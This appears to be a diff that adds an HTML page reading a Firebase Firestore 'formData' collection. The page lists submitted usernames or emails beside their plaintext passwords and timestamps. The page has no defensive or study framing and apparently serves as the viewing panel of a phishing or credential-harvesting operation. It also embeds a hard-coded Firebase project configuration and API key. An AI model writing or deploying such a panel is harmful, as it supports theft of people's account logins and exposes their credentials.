@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Data</title>
+    <!-- Include Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
+    <style>
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        table, th, td {
+            border: 1px solid #ddd;
+        }
+        th, td {
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+        tr:nth-child(even) {
+            background-color: #f9f9f9;
+        }
+        .timestamp {
+            white-space: nowrap;
+        }
+        h1 {
+            color: #333;
+            font-family: Arial, sans-serif;
+        }
+        .status {
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+            background-color: #f8f9fa;
+        }
+        .loading {
+            color: #0d6efd;
+        }
+        .error {
+            color: #dc3545;
+        }
+    </style>
+</head>
+<body>
+    <h1>Submitted Data</h1>
+    <div id="status" class="status">Loading data...</div>
+    <table id="dataTable">
+        <thead>
+            <tr>
+                <th>#</th>
+                <th>Username/Email</th>
+                <th>Password</th>
+                <th>Timestamp</th>
+            </tr>
+        </thead>
+        <tbody>
+            <!-- Rows will be inserted here dynamically -->
+        </tbody>
+    </table>
+    
+    <script>
+        // Your Firebase configuration
+        const firebaseConfig = {
+  apiKey: "AIzaSyBeyGiF7BEUNNJHJJ9J9bzB4cbNxx9wGYo",
+  authDomain: "nomanzs.firebaseapp.com",
+  projectId: "nomanzs",
+  storageBucket: "nomanzs.firebasestorage.app",
+  messagingSenderId: "967778935428",
+  appId: "1:967778935428:web:fea7c7a8fae9167a5298d1",
+  measurementId: "G-8GFDHEG1GJ"
+};
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        const statusDiv = document.getElementById('status');
+
+        // Fetch data from Firestore and sort by timestamp (descending)
+        db.collection('formData')
+            .orderBy('TimeStamp', 'desc') // Sort by timestamp in descending order (newest first)
+            .get()
+            .then((snapshot) => {
+                const tbody = document.querySelector('#dataTable tbody');
+                let rowNumber = 1; // Auto-numbering counter
+                
+                if (snapshot.empty) {
+                    statusDiv.textContent = 'No data found in the database.';
+                    return;
+                }
+
+                snapshot.forEach((doc) => {
+                    const data = doc.data();
+                    const row = document.createElement('tr');
+                    
+                    // Add row number
+                    const numberCell = document.createElement('td');
+                    numberCell.textContent = rowNumber++;
+                    row.appendChild(numberCell);
+                    
+                    // Add name
+                    const nameCell = document.createElement('td');
+                    nameCell.textContent = data.UserName || 'N/A';
+                    row.appendChild(nameCell);
+                    
+                    // Add password
+                    const password = document.createElement('td');
+                    password.textContent = data.Password || 'N/A';
+                    row.appendChild(password);
+                    
+                    // Add timestamp
+                    const timestampCell = document.createElement('td');
+                    timestampCell.className = 'timestamp';
+                    
+                    if (data.TimeStamp) {
+                        const date = data.TimeStamp.toDate();
+                        timestampCell.textContent = date.toLocaleString();
+                    } else {
+                        timestampCell.textContent = 'N/A';
+                    }
+                    
+                    row.appendChild(timestampCell);
+                    
+                    // Append the row to the table
+                    tbody.appendChild(row);
+                });
+                
+                // Update status message
+                statusDiv.textContent = `Displaying ${rowNumber - 1} submissions (newest first)`;
+                statusDiv.className = 'status';
+            })
+            .catch((error) => {
+                console.error('Error fetching data:', error);
+                statusDiv.textContent = `Error fetching data: ${error.message}`;
+                statusDiv.className = 'status error';
+            });
+    </script>
+</body>
+</html>
